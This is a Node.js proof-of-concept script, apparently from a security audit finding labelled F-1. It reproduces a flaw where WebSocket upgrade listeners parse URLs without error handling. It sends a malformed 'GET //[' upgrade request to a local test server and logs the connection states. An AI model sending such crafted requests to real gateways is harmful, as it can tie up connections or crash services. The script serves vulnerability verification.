// F-1 재현: 게이트웨이 리스너(new URL 무보호) 2개 + catch-all 을 index.js 와 같은 순서로 등록하고 'GET //[' upgrade 요청을 보낸다.
import http from 'node:http'; import net from 'node:net';
process.on('uncaughtException', (e) => console.log('uncaughtException:', e.message));
const server = http.createServer((req, res) => res.end('ok'));
let catchAll = 0;
server.on('upgrade', (req, socket) => { const url = new URL(req.url, 'http://localhost'); if (url.pathname !== '/api/remote/ssh') return; });
server.on('upgrade', (req, socket) => { const url = new URL(req.url, 'http://localhost'); if (url.pathname !== '/api/remote/rdp') return; });
server.on('upgrade', (req, socket) => { catchAll++; let p=''; try { p = new URL(req.url, 'http://localhost').pathname; } catch {} if (p !== '/api/remote/ssh' && p !== '/api/remote/rdp') socket.destroy(); });
server.keepAliveTimeout = 1500;
server.listen(0, '127.0.0.1', () => {
  const port = server.address().port;
  const run = (target, label) => new Promise((r) => {
    const c = net.connect(port, '127.0.0.1', () => c.write(`GET ${target} HTTP/1.1\r\nHost: x\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n`));
    let closed = false; c.on('close', () => { closed = true; });
    setTimeout(() => server.getConnections((_, n) => { console.log(`${label}: target=${target} clientClosed=${closed} serverConnections=${n} catchAllCalls=${catchAll}`); c.destroy(); r(); }), 3000);
  });
  (async () => { await run('/nope', 'baseline'); await run('//[', 'attack'); server.close(); })();
});
